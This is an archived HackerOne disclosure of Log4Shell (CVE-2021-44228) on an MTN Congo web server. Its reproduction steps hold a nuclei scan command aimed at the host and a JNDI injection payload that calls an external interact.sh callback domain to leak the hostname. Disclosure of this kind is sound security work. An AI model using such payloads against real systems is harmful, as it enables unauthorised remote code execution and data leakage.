---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
  - vuln/path-traversal
  - vuln/command-injection
  - vuln/code-injection
  - impact/rce
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2024-08-24
submitted: 2021-12-14T03:59:32.442Z
bounty_usd: null
votes: 30
cve: "CVE-2021-44228"
program: "[[programs/mtn_group|MTN Group]]"
reporter: "renzi"
source: "https://hackerone.com/reports/1425565"
title: "Remote code injection in Log4j on  https://mymtn.mtncongo.net - CVE-2021-44228"
---
# Remote code injection in Log4j on  https://mymtn.mtncongo.net - CVE-2021-44228

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 30 | **Program:** MTN Group | **Disclosed:** 2024-08-24

- Report: [https://hackerone.com/reports/1425565](https://hackerone.com/reports/1425565)
- CWE: OS Command Injection | CVE: CVE-2021-44228
- Submitted: 2021-12-14T03:59:32.442Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

###Summary
Hello,

I would to like report this security flaw on https://mymtn.mtncongo.net. Using script nuclei i can found CVE-2021-44228. This is a critical issue cause as remote command execution. On my test i just retrive hostname of machine via nuclei script. (https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)

###Steps To Reproduce
How we can reproduce the issue;

1. run nuclei script via cmd; ./nuclei -u https://mymtn.mtncongo.net:8443  -t ../nuclei-templates/cves/2021/CVE-2021-44228.yaml

It will retrive the hostname of machine on output " [net]"

Like this;

````
[2021-12-14 03:38:05] [CVE-2021-44228] [http] [critical] https://mymtn.mtncongo.net:8443/?x=${jndi:ldap://${hostName}.c6s11oscca8f9pc2lrggcghbdgeyyyd66.interact.sh/a} [net]
````

###Mitigation
Update according the vendor and thecnical references..

###References
https://www.tenable.com/blog/cve-2021-44228-proof-of-concept-for-critical-apache-log4j-remote-code-execution-vulnerability
https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476

## Impact

Remote command execution

## Timeline

- **Report Filed**
- **Report Triaged**
- **2022-01-14** @renzi: Thank you very much @incognito4 !
- **2022-03-22** @renzi: Hello @incognito4 ! Any update about this report until this moment?

Cheers,
@Renzi
- **2022-07-22** @renzi: Hello @incognito4 ! Any update?

Cheers,
@Renzi
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
